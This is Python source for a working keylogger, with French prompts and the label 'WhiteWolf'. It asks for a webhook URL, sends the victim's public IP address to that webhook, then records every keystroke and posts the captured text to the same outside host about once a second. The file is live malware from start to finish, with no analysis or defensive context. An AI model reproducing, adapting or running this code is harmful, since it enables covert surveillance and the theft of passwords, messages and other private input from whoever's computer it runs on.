import os
import time
import requests
import threading
from pynput import keyboard


red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
white = "\033[37m"
reset = "\033[0m"


os.system("cls")
webhook_choix = input(f""" {yellow}
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡠⠖⢉⣌⢆⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣠⠚⠉⠀⠈⠉⠲⣿⣿⡜⡀⠀⠀⠀⠀
            ⡔⢉⣙⣓⣒⡲⠮⡇⠀⠀⠀⠀⠀⠀⠘⡿⡇⡇⠀⠀⠀⠀
            ⡇⠘⣿⣿⣿⠏⠀⠀⠠⣀⡀⠀⠀⠀⠀⡇⠈⠳⡄⠀⠀⠀
            ⢹⠀⢻⣿⠇⠀⠀⣀⣀⠀⡍⠃⠀⠀⣠⣷⡟⢳⡜⡄⠀⠀
            ⠈⣆⠀⠋⢀⢔⣵⣿⠋⠹⣿⠒⠒⠚⠁⣿⣿⣾⣷⢸⠤⡄
            ⠀⡇⠀⠀⢸⢸⣿⣿⣶⣾⡏⡇⠀⠀⢀⡘⣝⠿⡻⢸⡰⠁
            ⠀⢳⠀⠀⠈⢆⠻⢿⡿⠟⡱⠁⠰⠛⢿⡇⠀⠉⠀⡸⠁⠀
            ⠀⠈⢆⠀⠀⠀⠉⠒⠒⣉⡀⠀⠀⢇⠀⡇⠀⠀⢠⠃⠀⠀
            ⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⢉⡱⠀⠀⠉⠀⢀⡴⠁⠀⠀⠀
            ⠀⠀⠀⠀⠈⠓⠦⣀⣉⡉⠁⢀⣀⣠⠤⠒⠥⣄⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠰⣉⣀⣀⡠⠭⠛⠀⠀⠑⠒⠤⠤⠷⠀⠀⠀
⠀⠀⠀⠀⠀⠀
             Met ton webhook : """)
os.system("cls")

webhook = webhook_choix

def ip():
    try:
        ip = requests.get("https://checkip.amazonaws.com").text.strip()
        data = {
            "content": ip,
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }
        requests.post(webhook, json=data)
    except ValueError:
        print("Value error")
        time.sleep(3)

ip()

buffer = ""
timer = None

def send_buffer():
    global buffer

    if buffer:
        requests.post(webhook, json={"content": buffer, "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"})
        buffer = ""

def reset_timer():
    global timer

    if timer:
        timer.cancel()

    timer = threading.Timer(1.0, send_buffer)  
    timer.start()

def on_press(key):
    global buffer

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"

    reset_timer()

def start_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

start_listener()
